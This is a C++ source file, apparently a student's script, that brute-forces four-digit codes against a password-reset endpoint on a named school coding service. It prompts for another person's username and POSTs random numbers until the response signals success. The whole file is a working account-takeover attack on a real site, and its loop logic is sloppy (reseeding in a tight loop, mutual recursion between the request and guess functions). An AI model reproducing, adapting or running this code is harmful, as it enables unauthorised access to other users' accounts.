#define CPPHTTPLIB_OPENSSL_SUPPORT
#include <iostream>
#include <unistd.h>
#include <memory>
#include <any>
#include <string> 
#include <cstdlib>
#include <bits/stdc++.h>
#include <cmath>
#include <stdlib.h>
#include <cstdlib>
#include <ctime>
#include <chrono>
#include "httplib.h"

//send requests to a pltw server, doing this for a class beacause mit app inventor is rotting my brain more than helping. 
// WEBSITE IS https://cs-api.pltw.org/
// Thx for the lib, its at https://github.com/yhirose/cpp-httplib
std::unordered_set<int> tried_numbers;
int randomnumber;
std::string USERP;
std::string PASSWORDP;
int amntoftimes;
int GetUserNameAndAmount();
int SendReq();

int guess(){
 if (amntoftimes != 0){
    amntoftimes -= 1;
    
    do{
        unsigned int seed = static_cast<unsigned int>(std::chrono::system_clock::now().time_since_epoch().count());
        srand(seed);
        randomnumber = rand() % 9000 + 1000;
    } while (tried_numbers.find(randomnumber)!= tried_numbers.end());
    tried_numbers.insert(randomnumber);
    std::cout << "Password Being Tried:" << randomnumber << "\n";
     SendReq();
     }else{
        std::cout << "Done. Didnt unlock it?\n";
         exit(0);
     }
     SendReq();
     return(0);
}

int SendReq(){
    httplib::Client client ("https://cs-api.pltw.org");
    std::string endpoint = "/" + USERP + "/reset?password=" + std::to_string(randomnumber);
    auto res = client.Post(endpoint.c_str(), "", "text/plain");

    if (res){
        std::cout << "Status:" << res->status << "\n";
        std::cout << "Response" << res->body << "\n";
         if(res->body.find(USERP) != std::string::npos){
          std::cout << "Password reset successful for user " << USERP << ".\n";
            exit(0); }
    }else{
        std::cerr << "Request Failed. (Rate limited?)\n";
    }
    guess();
    return res ? res->status : -1;
}


int GetUserNameAndAmount(){
    std::cout << "Whats their username:";
    std::getline(std::cin, USERP);
    std::cout << "\nWhats the amout you want:";
    std::cin >> amntoftimes;
    guess();
return(0);

}

int main(){
GetUserNameAndAmount(); 

return(0);
}